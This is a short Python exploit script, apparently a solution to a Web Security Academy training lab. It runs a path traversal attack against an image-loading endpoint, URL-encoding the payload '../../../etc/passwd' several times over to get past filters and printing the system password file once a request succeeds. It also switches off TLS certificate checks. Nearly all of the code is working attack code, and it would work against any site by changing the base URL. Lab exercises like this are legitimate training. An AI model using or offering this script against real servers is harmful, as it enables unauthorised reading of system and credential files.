import requests
import urllib3
from bs4 import BeautifulSoup
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def multi_encode(payload, depth):
    for _ in range(depth):
        payload = quote(payload, safe='')
    print(payload)
    return payload

def main():
    base_url= 'https://0a9500130349a89480ad58bf00c70003.web-security-academy.net'
    product_url = f'{base_url}/image?filename='
    initial_payload='../../../etc/passwd'

    session = requests.Session()
    for depth in range(1, 6):
        encoded_payload = multi_encode(initial_payload, depth)
        attack_url = f'{product_url}{encoded_payload}'
        response = session.get(attack_url, verify=False)

        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "html.parser")
            print(f"Payload with depth {depth} succeeded:")
            print(soup)
            print("Koated !!")
            break
        else:
            print(f"Payload with depth {depth} failed with status code {response.status_code}")


if __name__ == "__main__" :
    main()
        